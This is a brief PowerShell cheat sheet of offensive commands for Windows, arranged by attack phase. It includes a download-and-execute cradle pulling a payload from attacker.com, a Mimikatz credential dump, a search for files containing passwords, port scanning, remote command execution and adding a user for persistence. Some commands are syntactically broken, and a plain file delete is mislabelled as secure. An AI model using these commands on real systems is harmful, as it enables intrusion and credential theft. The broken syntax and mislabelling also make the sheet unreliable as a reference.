# Windows Powershell

### System Reconnaissance

 - Get-WmiObject -Class Win32_OperatingSystem (Enumerate System Information)

 - Get-Service | Where-Object {$_.Status -eq "Running"} (Check for running services)

 - Get-NetIPConfiguration (Get current network configuration)

### User and Group Enumeration

 - Get-LocalUser (List local users)

 - quser (List user sessions)

 - Get-LocalGroup (List local groups)

 - Get-LocalGroupMember -Group "Administrators" (List group members)

### Network Scanning

 - Test-Connection IP -Count 1 -Quiet (Discover live systems)

 - 1..1024 | % {echo ((new-objectNet.Sockets.TcpClient).Connect("192.168.1.1", $_)) "Port$_ is open"} (Scan for open ports)

### Exploitation

 - IEX (New-ObjectNet.WebClient).DownloadString('http://attacker.com/payload.ps1') (Download and execute a payload)

### File and Directory Manipulation

 - Get-ChildItem -Recurse | Select-String -Pattern"password" (Search for files with sensitive data)

 - (Get-Item "secret.txt").Delete() (Securely delete a file)

### Credential Harvesting

 - Import-Module Mimikatz.ps1

 - Invoke-Mimikatz -DumpCreds (Dump credentials from memory)

### Privilege Escalation

 - ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator") (Check for admin privileges)

### Lateral Movement

 - Invoke-Command -ComputerName TARGET_IP ScriptBlock {COMMAND} -credential (Get-Credential)

### Post Exploitation

 - net user /add USER
